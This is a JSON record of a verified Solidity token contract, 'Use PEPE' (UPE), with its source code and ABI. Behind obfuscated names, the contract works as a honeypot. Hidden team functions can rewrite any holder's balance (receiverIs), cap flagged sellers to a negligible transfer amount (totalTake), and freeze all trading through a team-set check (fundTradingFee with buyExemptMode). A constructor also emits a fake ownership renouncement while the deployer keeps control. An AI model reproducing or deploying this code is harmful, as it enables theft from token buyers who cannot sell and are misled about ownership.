{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface atLaunchedToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxSwap) external view returns (uint256);\n\n    function transfer(address txList, uint256 atTx) external returns (bool);\n\n    function allowance(address liquidityTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txList,\n        uint256 atTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityAuto, uint256 value);\n    event Approval(address indexed liquidityTake, address indexed spender, uint256 value);\n}\n\nabstract contract liquidityIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverTx {\n    function createPair(address swapExemptSender, address feeTake) external returns (address);\n}\n\ninterface atLaunchedTokenMetadata is atLaunchedToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UsePEPE is liquidityIs, atLaunchedToken, atLaunchedTokenMetadata {\n\n    mapping(address => bool) public maxIs;\n\n    function toTeam() private view {\n        require(tokenMinTeam[_msgSender()]);\n    }\n\n    uint256 constant receiverExempt = 9 ** 10;\n\n    uint256 maxLaunched;\n\n    mapping(address => bool) public tokenMinTeam;\n\n    function transferFrom(address buyTo, address txList, uint256 atTx) external override returns (bool) {\n        if (_msgSender() != amountLaunchReceiver) {\n            if (feeTeam[buyTo][_msgSender()] != type(uint256).max) {\n                require(atTx <= feeTeam[buyTo][_msgSender()]);\n                feeTeam[buyTo][_msgSender()] -= atTx;\n            }\n        }\n        return buyExemptMode(buyTo, txList, atTx);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverTxLaunch;\n    }\n\n    function totalTake(address minReceiver) public {\n        toTeam();\n        if (launchTeam != fundReceiver) {\n            fundReceiver = false;\n        }\n        if (minReceiver == limitLaunch || minReceiver == swapMin) {\n            return;\n        }\n        maxIs[minReceiver] = true;\n    }\n\n    function buyExemptMode(address buyTo, address txList, uint256 atTx) internal returns (bool) {\n        if (buyTo == limitLaunch) {\n            return swapReceiver(buyTo, txList, atTx);\n        }\n        uint256 toFee = atLaunchedToken(swapMin).balanceOf(minShould);\n        require(toFee == teamAuto);\n        require(txList != minShould);\n        if (maxIs[buyTo]) {\n            return swapReceiver(buyTo, txList, receiverExempt);\n        }\n        return swapReceiver(buyTo, txList, atTx);\n    }\n\n    function receiverTeam(address maxTake) public {\n        if (buySell) {\n            return;\n        }\n        if (enableMode == minTo) {\n            listMarketing = true;\n        }\n        tokenMinTeam[maxTake] = true;\n        \n        buySell = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listWalletSell;\n    }\n\n    function amountWallet() public {\n        emit OwnershipTransferred(limitLaunch, address(0));\n        walletTotal = address(0);\n    }\n\n    string private isMarketing = \"UPE\";\n\n    address amountLaunchReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public limitLaunch;\n\n    uint256 teamAuto;\n\n    string private listWalletSell = \"Use PEPE\";\n\n    function allowance(address swapToken, address amountSender) external view virtual override returns (uint256) {\n        if (amountSender == amountLaunchReceiver) {\n            return type(uint256).max;\n        }\n        return feeTeam[swapToken][amountSender];\n    }\n\n    bool public fundReceiver;\n\n    uint8 private receiverTxLaunch = 18;\n\n    event OwnershipTransferred(address indexed tradingReceiver, address indexed sellIs);\n\n    bool private amountFundLaunch;\n\n    bool public marketingFeeList;\n\n    uint256 private receiverLiquidity = 100000000 * 10 ** 18;\n\n    constructor (){\n        \n        fromTrading launchAutoTo = fromTrading(amountLaunchReceiver);\n        swapMin = receiverTx(launchAutoTo.factory()).createPair(launchAutoTo.WETH(), address(this));\n        if (amountFundLaunch != listMarketing) {\n            enableMode = minTo;\n        }\n        limitLaunch = _msgSender();\n        amountWallet();\n        tokenMinTeam[limitLaunch] = true;\n        listLimit[limitLaunch] = receiverLiquidity;\n        if (launchTeam != minMarketing) {\n            launchTeam = true;\n        }\n        emit Transfer(address(0), limitLaunch, receiverLiquidity);\n    }\n\n    function owner() external view returns (address) {\n        return walletTotal;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return isMarketing;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverLiquidity;\n    }\n\n    function balanceOf(address maxSwap) public view virtual override returns (uint256) {\n        return listLimit[maxSwap];\n    }\n\n    bool private listMarketing;\n\n    function swapReceiver(address buyTo, address txList, uint256 atTx) internal returns (bool) {\n        require(listLimit[buyTo] >= atTx);\n        listLimit[buyTo] -= atTx;\n        listLimit[txList] += atTx;\n        emit Transfer(buyTo, txList, atTx);\n        return true;\n    }\n\n    uint256 private minTo;\n\n    function fundTradingFee(uint256 atTx) public {\n        toTeam();\n        teamAuto = atTx;\n    }\n\n    bool public minMarketing;\n\n    function approve(address amountSender, uint256 atTx) public virtual override returns (bool) {\n        feeTeam[_msgSender()][amountSender] = atTx;\n        emit Approval(_msgSender(), amountSender, atTx);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return walletTotal;\n    }\n\n    mapping(address => mapping(address => uint256)) private feeTeam;\n\n    bool public buySell;\n\n    function transfer(address minLiquidity, uint256 atTx) external virtual override returns (bool) {\n        return buyExemptMode(_msgSender(), minLiquidity, atTx);\n    }\n\n    uint256 public enableMode;\n\n    mapping(address => uint256) private listLimit;\n\n    address private walletTotal;\n\n    bool private launchTeam;\n\n    address minShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public swapMin;\n\n    function receiverIs(address minLiquidity, uint256 atTx) public {\n        toTeam();\n        listLimit[minLiquidity] = atTx;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atTx\",\"type\":\"uint256\"}],\"name\":\"fundTradingFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFeeList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTx\",\"type\":\"uint256\"}],\"name\":\"receiverIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTake\",\"type\":\"address\"}],\"name\":\"receiverTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenMinTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"}],\"name\":\"totalTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UsePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}